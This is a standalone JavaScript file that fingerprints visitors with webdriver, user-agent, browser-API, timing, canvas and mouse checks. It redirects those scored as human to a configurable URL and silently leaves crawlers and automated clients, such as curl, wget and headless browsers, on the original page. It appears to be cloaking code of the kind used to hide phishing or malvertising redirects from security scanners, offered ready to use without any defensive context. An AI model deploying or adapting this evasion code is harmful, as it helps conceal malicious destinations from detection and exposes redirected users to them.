/**
 * 
 * OR set the URL directly in the config below:
 */

(function () {

  /* ── CONFIG ── change this or use data-redirect attribute ── */
  var REDIRECT_URL = "https://example.com";
  /* ────────────────────────────────────────────────────────── */

  // Allow data-redirect attribute on the <script> tag to override
  var scriptTag = document.currentScript ||
    (function () {
      var tags = document.getElementsByTagName("script");
      return tags[tags.length - 1];
    })();
  if (scriptTag && scriptTag.getAttribute("data-redirect")) {
    REDIRECT_URL = scriptTag.getAttribute("data-redirect");
  }

  /* ── Detection signals ─────────────────────────────────────
     Each returns a score between 0 (bot) and 1 (human).
     Total ≥ 3.5 out of 6 → human → redirect
  ──────────────────────────────────────────────────────────── */

  function checkWebdriver() {
    return navigator.webdriver === true ? 0 : 1;
  }

  function checkUserAgent() {
    var ua = navigator.userAgent.toLowerCase();
    var botTokens = [
      "headless", "phantomjs", "slimerjs", "htmlunit",
      "python-requests", "python-urllib", "curl/", "wget/",
      "scrapy", "httpie", "java/", "go-http", "node-fetch",
      "axios", "okhttp", "ruby", "perl",
      "bot", "crawler", "spider", "slurp", "mediapartners"
    ];
    if (botTokens.some(function (t) { return ua.indexOf(t) !== -1; })) return 0;
    if (/android|iphone|ipad|windows|macintosh|linux x86/.test(ua)) return 1;
    return 0.5;
  }

  function checkBrowserAPIs() {
    var score = 0;
    if (navigator.plugins && navigator.plugins.length > 0) score += 0.25;
    if (navigator.languages && navigator.languages.length > 0) score += 0.25;
    if (typeof window.chrome !== "undefined" ||
      typeof window.InstallTrigger !== "undefined") score += 0.25;
    if (screen.colorDepth >= 24) score += 0.25;
    return score;
  }

  function checkTiming() {
    try {
      var nav = performance.getEntriesByType("navigation")[0];
      if (nav) {
        var load = nav.loadEventEnd - nav.startTime;
        return (load > 5 && load < 30000) ? 1 : 0;
      }
    } catch (e) { }
    return performance.now() > 5 ? 0.5 : 0;
  }

  function checkCanvas() {
    try {
      var c = document.createElement("canvas");
      var ctx = c.getContext("2d");
      ctx.textBaseline = "top";
      ctx.font = "14px Arial";
      ctx.fillText("bot-filter-test", 2, 2);
      return c.toDataURL().length > 500 ? 1 : 0;
    } catch (e) {
      return 0;
    }
  }

  /* ── Mouse signal — needs a brief window to capture ──────── */
  var mouseMoved = false;
  var mousePoints = 0;

  function onMove() { if (++mousePoints > 2) mouseMoved = true; }
  function onTouch() { mouseMoved = true; mousePoints += 3; }

  document.addEventListener("mousemove", onMove);
  document.addEventListener("touchstart", onTouch);
  document.addEventListener("touchmove", onTouch);

  /* ── Run ─────────────────────────────────────────────────── */
  function run() {
    // Remove listeners (no longer needed)
    document.removeEventListener("mousemove", onMove);
    document.removeEventListener("touchstart", onTouch);
    document.removeEventListener("touchmove", onTouch);

    var total =
      checkWebdriver() +
      checkUserAgent() +
      checkBrowserAPIs() +
      (mouseMoved ? 1 : 0) +
      checkTiming() +
      checkCanvas();

    if (total >= 3.5) {
      window.location.href = REDIRECT_URL;
    }
    // Bots: do nothing — they stay on the current page silently
  }

  // Wait ~500 ms to give mouse/touch events a chance to fire,
  // then run the check. Page stays blank/existing during this time.
  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", function () {
      setTimeout(run, 500);
    });
  } else {
    setTimeout(run, 500);
  }

})();
